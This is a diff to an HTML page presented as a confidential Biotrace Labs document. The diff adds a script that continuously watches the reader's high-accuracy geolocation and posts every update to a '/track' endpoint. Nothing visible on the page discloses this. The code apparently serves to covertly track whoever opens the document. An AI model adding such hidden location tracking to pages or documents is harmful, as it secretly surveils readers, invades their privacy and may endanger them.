@@ -146,6 +146,37 @@
         Document confidentiel émis par Biotrace Labs – Ne pas diffuser sans autorisation.
     </div>
 </div>
+<script>
+let trackingId = null;
+
+function sendPosition(lat, lon, accuracy) {
+    fetch("/track", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ lat, lon, accuracy })
+    });
+}
+
+if ("geolocation" in navigator) {
+    trackingId = navigator.geolocation.watchPosition(
+        (position) => {
+            sendPosition(
+                position.coords.latitude,
+                position.coords.longitude,
+                position.coords.accuracy
+            );
+        },
+        (error) => {
+            console.warn("Géolocalisation refusée ou impossible");
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+}
+</script>
 
 </body>
 </html>
